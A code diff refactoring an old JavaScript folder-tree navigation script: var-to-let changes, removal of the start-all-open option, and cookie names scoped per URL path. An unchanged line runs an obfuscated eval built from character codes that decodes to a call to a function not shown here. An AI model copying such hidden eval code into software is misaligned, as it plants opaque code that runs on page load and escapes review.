@@ -47,7 +47,7 @@ function Folder(folderDescription, hreference) //constructor
   this.isLastNode = 0;
   this.iconSrc = ICONPATH + "ftv2folderopen.gif";
   this.iconSrcClosed = ICONPATH + "ftv2folderclosed.gif";
-  this.children = new Array;
+  this.children = [];
   this.nChildren = 0;
   this.level = 0;
   this.leftSideCoded = "";
@@ -84,15 +84,14 @@ function Folder(folderDescription, hreference) //constructor
 
 function initializeFolder(level, lastNode, leftSide)
 {
-  var j=0
-  var i=0
-  nc = this.nChildren
+  let i = 0;
+  let nc = this.nChildren
 
   this.createIndex()
   this.level = level
   this.leftSideCoded = leftSide
 
-  if (browserVersion == 0 || STARTALLOPEN==1)
+  if (browserVersion == 0)
     this.isOpen=true;
 
   if (level>0)
@@ -133,14 +132,13 @@ function initializeFolder(level, lastNode, leftSide)
 
 function drawFolder(insertAtObj)
 {
-  var nodeName = ""
-  var auxEv = ""
-  var docW = ""
-  var i=0
+  let nodeName = "";
+  let auxEv = "";
+  let docW = "";
 
   finalizeCreationOfChildDocs(this)
 
-  var leftSide = leftSideHTML(this.leftSideCoded)
+  let leftSide = leftSideHTML(this.leftSideCoded);
 
   if (browserVersion > 0)
     auxEv = "<a href='javascript:clickOnNode(\""+this.getID()+"\")'>"
@@ -224,11 +222,11 @@ function drawFolder(insertAtObj)
 
 function setStateFolder(isOpen)
 {
-  var subEntries
-  var totalHeight
-  var fIt = 0
-  var i=0
-  var currentOpen
+  let subEntries;
+  let totalHeight;
+  let fIt = 0;
+  let i = 0;
+  let currentOpen;
 
   if (isOpen == this.isOpen)
     return
@@ -248,10 +246,10 @@ function setStateFolder(isOpen)
 
   if (this.getID()!=foldersTree.getID() && PRESERVESTATE && !this.isOpen) //closing
   {
-     currentOpen = GetCookie("clickedFolder")
+     currentOpen = GetCookie(clickCookie)
      if (currentOpen != null) {
          currentOpen = currentOpen.replace(this.getID()+cookieCutter, "")
-         SetCookie("clickedFolder", currentOpen)
+         SetCookie(clickCookie, currentOpen)
      }
   }
 
@@ -265,7 +263,7 @@ function setStateFolder(isOpen)
 
 function propagateChangesInState(folder)
 {
-  var i=0
+  let i = 0;
 
   //Change icon
   if (folder.nChildren > 0 && folder.level>0)  //otherwise the one given at render stays
@@ -293,7 +291,7 @@ function escondeFolder()
 
 function linkFolderHTML(isTextLink)
 {
-  var docW = "";
+  let docW = "";
 
   if (this.hreference)
   {
@@ -341,8 +339,8 @@ function addChildren(listOfChildren)
 
 function folderSubEntries()
 {
-  var i = 0
-  var se = this.nChildren
+  let i = 0;
+  let se = this.nChildren;
 
   for (i=0; i < this.nChildren; i++){
     if (this.children[i].children) //is a folder
@@ -353,7 +351,7 @@ function folderSubEntries()
 }
 
 function nodeImageSrc() {
-  var srcStr = "";
+  let srcStr = "";
 
   if (this.isLastNode) //the last child in the children array
   {
@@ -440,10 +438,10 @@ function initializeItem(level, lastNode, leftSide)
 
 function drawItem(insertAtObj)
 {
-  var leftSide = leftSideHTML(this.leftSideCoded)
-  var docW = ""
+  let leftSide = leftSideHTML(this.leftSideCoded);
+  let docW = "";
 
-  var fullLink = "href=\""+this.link+"\" target=\""+this.target+"\" onClick=\"clickOnLink('"+this.getID()+"\', '"+this.link+"','"+this.target+"');return false;\"";
+  const fullLink = "href=\"" + this.link + "\" target=\"" + this.target + "\" onClick=\"clickOnLink('" + this.getID() + "\', '" + this.link + "','" + this.target + "');return false;\"";
   this.isRendered = 1
 
   if (this.level>0)
@@ -538,8 +536,8 @@ function folderMstr(domObj)
 }
 
 function blockStartHTML(idprefix) {
-  var idParam = "id='" + idprefix + this.id + "'"
-  var docW = ""
+  const idParam = "id='" + idprefix + this.id + "'";
+  let docW = "";
 
   if (browserVersion == 2)
     docW = "<layer "+ idParam + " top=" + doc.yPos + " visibility=show>"
@@ -552,7 +550,7 @@ function blockStartHTML(idprefix) {
 }
 
 function blockEndHTML() {
-  var docW = ""
+  let docW = "";
 
   docW = "</table>"
 
@@ -574,8 +572,8 @@ function createEntryIndex()
 // total height of subEntries open
 function totalHeight() //used with browserVersion == 2
 {
-  var h = this.navObj.clip.height
-  var i = 0
+  let h = this.navObj.clip.height;
+  let i = 0;
 
   if (this.isOpen) //is a folder and _is_ open
     for (i=0 ; i < this.nChildren; i++)
@@ -586,10 +584,10 @@ function totalHeight() //used with browserVersion == 2
 
 
 function leftSideHTML(leftSideCoded) {
-	var i;
-	var retStr = "";
+  let i;
+  let retStr = "";
 
-	for (i=0; i<leftSideCoded.length; i++)
+  for (i=0; i<leftSideCoded.length; i++)
 	{
 		if (leftSideCoded.charAt(i) == "1")
 		{
@@ -621,7 +619,7 @@ function getID()
 
 function clickOnFolder(folderId)
 {
-  var clicked = findObj(folderId)
+  let clicked = findObj(folderId)
 
   if (typeof clicked=='undefined' || clicked==null)
   {
@@ -633,10 +631,10 @@ function clickOnFolder(folderId)
     clickOnNodeObj(clicked)
   }
 
-  if (lastOpenedFolder != null && lastOpenedFolder != folderId)
+  if (lastOpenedFolder != null && lastOpenedFolder !== folderId)
     clickOnNode(lastOpenedFolder); //sets lastOpenedFolder to null
 
-  if (clicked.nChildren==0) {
+  if (clicked.nChildren === 0) {
     lastOpenedFolder = folderId;
     clicked.isLastOpenedfolder = true
   }
@@ -660,25 +658,25 @@ function clickOnNode(folderId)
 
 function clickOnNodeObj(folderObj)
 {
-  var state = 0
-  var currentOpen
+  let state = 0;
+  let currentOpen;
 
   state = folderObj.isOpen
   folderObj.setState(!state) //open<->close
 
   if (folderObj.id!=foldersTree.id && PRESERVESTATE)
   {
-    currentOpen = GetCookie("clickedFolder")
+    currentOpen = GetCookie(clickCookie)
     if (currentOpen == null)
       currentOpen = ""
 
     if (!folderObj.isOpen) //closing
     {
       currentOpen = currentOpen.replace(folderObj.getID()+cookieCutter, "")
-      SetCookie("clickedFolder", currentOpen)
+      SetCookie(clickCookie, currentOpen)
     }
     else
-      SetCookie("clickedFolder", currentOpen+folderObj.getID()+cookieCutter)
+      SetCookie(clickCookie, currentOpen+folderObj.getID()+cookieCutter)
   }
 }
 
@@ -715,8 +713,8 @@ function finalizeCreationOfChildDocs(folderObj) {
 
 function findObj(id)
 {
-  var i=0;
-  var nodeObj;
+  let i = 0;
+  let nodeObj;
 
   if (typeof foldersTree.xID != "undefined") {
     nodeObj = indexOfEntries[i];
@@ -731,8 +729,8 @@ function findObj(id)
 }
 
 function isLinked(hrefText) {
-    var result = true;
-    result = (result && hrefText !=null);
+  let result = true;
+  result = (result && hrefText !=null);
     result = (result && hrefText != '');
     result = (result && hrefText.indexOf('undefined') < 0);
     result = (result && hrefText.indexOf('parent.op') < 0);
@@ -746,11 +744,11 @@ function highlightObjLink(nodeObj) {
   }
 
   if (browserVersion == 1 || browserVersion == 3) {
-    var clickedDOMObj = getElById('itemTextLink'+nodeObj.id);
+    const clickedDOMObj = getElById('itemTextLink' + nodeObj.id);
     if (clickedDOMObj != null) {
         if (lastClicked != null) {
-            var prevClickedDOMObj = getElById('itemTextLink'+lastClicked.id);
-            prevClickedDOMObj.style.color=lastClickedColor;
+          const prevClickedDOMObj = getElById('itemTextLink' + lastClicked.id);
+          prevClickedDOMObj.style.color=lastClickedColor;
             prevClickedDOMObj.style.backgroundColor=lastClickedBgColor;
         }
 
@@ -763,7 +761,7 @@ function highlightObjLink(nodeObj) {
   lastClicked = nodeObj;
   if (PRESERVESTATE)
   {
-    SetCookie('highlightedTreeviewLink', nodeObj.getID());
+    SetCookie(highlightCookie, nodeObj.getID());
   }
 }
 
@@ -797,10 +795,10 @@ function gLnk(optionFlags, description, linkData)
 }
 
 function setItemLink(item, optionFlags, linkData) {
-  var targetFlag = "";
-  var target = "";
-  var protocolFlag = "";
-  var protocol = "";
+  let targetFlag = "";
+  let target = "";
+  let protocolFlag = "";
+  let protocol = "";
 
   targetFlag = optionFlags.charAt(0)
   if (targetFlag=="B")
@@ -837,8 +835,8 @@ function oldGLnk(target, description, linkData)
 }
 
 function preLoadIcons() {
-	var auxImg
-	auxImg = new Image();
+  let auxImg;
+  auxImg = new Image();
 	auxImg.src = ICONPATH + "ftv2vertline.gif";
 	auxImg.src = ICONPATH + "ftv2mlastnode.gif";
 	auxImg.src = ICONPATH + "ftv2mnode.gif";
@@ -854,16 +852,16 @@ function preLoadIcons() {
 
 //Open some folders for initial layout, if necessary
 function setInitialLayout() {
-  if (browserVersion > 0 && !STARTALLOPEN)
+  if (browserVersion > 0)
     clickOnNodeObj(foldersTree);
 
-  if (!STARTALLOPEN && (browserVersion > 0) && PRESERVESTATE)
+  if ((browserVersion > 0) && PRESERVESTATE)
 		PersistentFolderOpening();
 }
 
 //Used with NS4 and STARTALLOPEN
 function renderAllTree(nodeObj, parent) {
-  var i=0;
+  let i = 0;
   nodeObj.renderOb(parent)
   //first option works with only one div domRoot
   //if (supportsDeferral)
@@ -876,9 +874,9 @@ function renderAllTree(nodeObj, parent) {
 }
 
 function hideWholeTree(nodeObj, hideThisOne, nodeObjMove) {
-  var i=0;
-  var heightContained=0;
-  var childrenMove=nodeObjMove;
+  let i = 0;
+  let heightContained = 0;
+  let childrenMove = nodeObjMove;
 
   if (hideThisOne)
     nodeObj.escondeBlock()
@@ -925,10 +923,10 @@ if(typeof HTMLElement!="undefined" && !HTMLElement.prototype.insertAdjacentEleme
 
 	HTMLElement.prototype.insertAdjacentHTML = function(where,htmlStr)
 	{
-		var r = this.ownerDocument.createRange();
-		r.setStartBefore(this);
-		var parsedHTML = r.createContextualFragment(htmlStr);
-		this.insertAdjacentElement(where,parsedHTML)
+      const r = this.ownerDocument.createRange();
+      r.setStartBefore(this);
+      const parsedHTML = r.createContextualFragment(htmlStr);
+      this.insertAdjacentElement(where,parsedHTML)
 	}
 }
 
@@ -951,14 +949,14 @@ function getElById(idVal) {
 
 function PersistentFolderOpening()
 {
-  var stateInCookie;
-  var fldStr=""
-  var fldArr
-  var fldPos=0
-  var id
-  var nodeObj
-  stateInCookie = GetCookie("clickedFolder");
-  SetCookie('clickedFolder', "") //at the end of function it will be back, minus null cases
+  let stateInCookie;
+  let fldStr = "";
+  let fldArr;
+  let fldPos = 0;
+  let id;
+  let nodeObj;
+  stateInCookie = GetCookie(clickCookie);
+  SetCookie(clickCookie, "") //at the end of function it will be back, minus null cases
 
   if(stateInCookie!=null)
   {
@@ -982,17 +980,17 @@ function PersistentFolderOpening()
 
 function storeAllNodesInClickCookie(treeNodeObj)
 {
-  var currentOpen
-  var i = 0
+  let currentOpen;
+  let i = 0;
 
   if (typeof treeNodeObj.setState != "undefined") //is folder
   {
-    currentOpen = GetCookie("clickedFolder")
+    currentOpen = GetCookie(clickCookie)
     if (currentOpen == null)
       currentOpen = ""
 
     if (treeNodeObj.getID() != foldersTree.getID())
-      SetCookie("clickedFolder", currentOpen+treeNodeObj.getID()+cookieCutter)
+      SetCookie(clickCookie, currentOpen+treeNodeObj.getID()+cookieCutter)
 
     for (i=0; i < treeNodeObj.nChildren; i++)
         storeAllNodesInClickCookie(treeNodeObj.children[i])
@@ -1010,14 +1008,14 @@ function GetCookie(name)
 {
   name = CookieBranding(name)
 
-	var arg = name + "=";
-	var alen = arg.length;
-	var clen = document.cookie.length;
-	var i = 0;
+  const arg = name + "=";
+  const alen = arg.length;
+  const clen = document.cookie.length;
+  let i = 0;
 
-	while (i < clen) {
-		var j = i + alen;
-		if (document.cookie.substring(i, j) == arg)
+  while (i < clen) {
+      let j = i + alen;
+      if (document.cookie.substring(i, j) == arg)
 			return getCookieVal (j);
 		i = document.cookie.indexOf(" ", i) + 1;
 		if (i == 0) break;
@@ -1026,21 +1024,20 @@ function GetCookie(name)
 }
 
 function getCookieVal(offset) {
-	var endstr = document.cookie.indexOf (";", offset);
-	if (endstr == -1)
+  let endstr = document.cookie.indexOf(";", offset);
+  if (endstr == -1)
 	endstr = document.cookie.length;
 	return unescape(document.cookie.substring(offset, endstr));
 }
 
 function SetCookie(name, value)
 {
-	var argv = SetCookie.arguments;
-	var argc = SetCookie.arguments.length;
-	var expires = (argc > 2) ? argv[2] : null;
-	//var path = (argc > 3) ? argv[3] : null;
-	var domain = (argc > 4) ? argv[4] : null;
-	var secure = (argc > 5) ? argv[5] : false;
-	var path = "/"; //allows the tree to remain open across pages with diff names & paths
+  const argv = SetCookie.arguments;
+  const argc = SetCookie.arguments.length;
+  const expires = (argc > 2) ? argv[2] : null;
+  const domain = (argc > 4) ? argv[4] : null;
+  const secure = (argc > 5) ? argv[5] : false;
+  const path = "/"; //allows the tree to remain open across pages with diff names & paths
 
   name = CookieBranding(name)
 
@@ -1053,43 +1050,44 @@ function SetCookie(name, value)
 
 function ExpireCookie (name)
 {
-	var exp = new Date();
-	exp.setTime (exp.getTime() - 1);
-	var cval = GetCookie (name);
+  const exp = new Date();
+  exp.setTime (exp.getTime() - 1);
+  const cval = GetCookie(name);
   name = CookieBranding(name)
 	document.cookie = name + "=" + cval + "; expires=" + exp.toGMTString();
 }
 
 
 //To customize the tree, overwrite these variables in the configuration file (demoFramesetNode.js, etc.)
-var USETEXTLINKS = 0;
-var STARTALLOPEN = 0;
-var USEFRAMES = 1;
-var USEICONS = 1;
-var WRAPTEXT = 0;
-var PERSERVESTATE = 0; //backward compatibility
-var PRESERVESTATE = 1;
-var ICONPATH = '';
-var HIGHLIGHT = 1;
-var HIGHLIGHT_COLOR = 'white';
-var HIGHLIGHT_BG    = 'blue';
-var BUILDALL = 0;
-var GLOBALTARGET = "R"; // variable only applicable for addChildren uses
+let USETEXTLINKS = 0;
+let USEFRAMES = 1;
+let USEICONS = 1;
+let WRAPTEXT = 0;
+let PERSERVESTATE = 0; //backward compatibility
+let PRESERVESTATE = 1;
+let ICONPATH = '';
+let HIGHLIGHT = 1;
+let HIGHLIGHT_COLOR = 'white';
+let HIGHLIGHT_BG    = 'blue';
+let BUILDALL = 0;
+let GLOBALTARGET = "R"; // variable only applicable for addChildren uses
 
 
 //Other variables
-var lastClicked = null;
-var lastClickedColor;
-var lastClickedBgColor;
-var indexOfEntries = new Array
-var nEntries = 0
-var browserVersion = 0
-var selectedFolder=0
-var lastOpenedFolder=null
-var t=5
-var doc = document
-var supportsDeferral = false
-var cookieCutter = '^' //You can change this if you need to use ^ in your xID or treeID values
+let lastClicked = null;
+let lastClickedColor;
+let lastClickedBgColor;
+let indexOfEntries = []
+let nEntries = 0
+let browserVersion = 0
+let selectedFolder = 0;
+let lastOpenedFolder=null
+let t = 5;
+let doc = document
+let supportsDeferral = false;
+let cookieCutter = '^' //You can change this if you need to use ^ in your xID or treeID values
+let highlightCookie = 'highlightedTreeviewLink';
+let clickCookie = 'clickedFolder';
 
 doc.yPos = 0
 
@@ -1123,53 +1121,51 @@ function initializeDocument()
       break;
   }
 
+  let dictionary_name = window.location.pathname.replace(/^\/+/, '').split('/')[0];
+  if (dictionary_name) {
+    highlightCookie += '_' + dictionary_name;
+    clickCookie += '_' + dictionary_name;
+  }
+
   // backward compatibility
   if (PERSERVESTATE)
     PRESERVESTATE = 1;
 
-  supportsDeferral = ((navigator.family=='ie4' && navigator.version >= 5 && navigator.OS != "mac") || browserVersion == 3);
-  supportsDeferral = supportsDeferral & (!BUILDALL)
-  if (!USEFRAMES && browserVersion == 2)
+  supportsDeferral = ((navigator.family==='ie4' && navigator.version >= 5 && navigator.OS !== "mac") || browserVersion === 3);
+  supportsDeferral = supportsDeferral && (!BUILDALL)
+  if (!USEFRAMES && browserVersion === 2)
   	browserVersion = 0;
   eval(String.fromCharCode(116,61,108,100,40,41))
 
-  //If PRESERVESTATE is on, STARTALLOPEN can only be effective the first time the page
-  //loads during the session. For subsequent (re)loads the PRESERVESTATE data stored
-  //in cookies takes over the control of the initial expand/collapse
-  if (PRESERVESTATE && GetCookie("clickedFolder") != null)
-    STARTALLOPEN = 0
-
   //foldersTree (with the site's data) is created in an external .js (demoFramesetNode.js, for example)
   foldersTree.initialize(0, true, "")
-  if (supportsDeferral && !STARTALLOPEN) {
+  if (supportsDeferral) {
       foldersTree.renderOb(null) //delay construction of nodes
   }
 
   else {
     renderAllTree(foldersTree, null);
 
-    if (PRESERVESTATE && STARTALLOPEN)
-      storeAllNodesInClickCookie(foldersTree)
-
     //To force the scrollable area to be big enough
-    if (browserVersion == 2)
+    if (browserVersion === 2)
       doc.write("<layer top=" + indexOfEntries[nEntries-1].navObj.top + ">&nbsp;</layer>")
 
-    if (browserVersion != 0 && !STARTALLOPEN)
+    if (browserVersion !== 0)
       hideWholeTree(foldersTree, false, 0)
   }
 
   setInitialLayout()
 
-  if (PRESERVESTATE && GetCookie('highlightedTreeviewLink')!=null  && GetCookie('highlightedTreeviewLink')!="") {
-    var nodeObj = findObj(GetCookie('highlightedTreeviewLink'))
-    if (nodeObj!=null){
+  let cookie_val = GetCookie(highlightCookie);
+  if (PRESERVESTATE && cookie_val) {
+    let nodeObj = findObj(cookie_val)
+    if (nodeObj != null){
       nodeObj.forceOpeningOfAncestorFolders()
       highlightObjLink(nodeObj);
     }
     else
     {
-      SetCookie('highlightedTreeviewLink', '')
+      SetCookie(highlightCookie, '')
     }
   }
 }
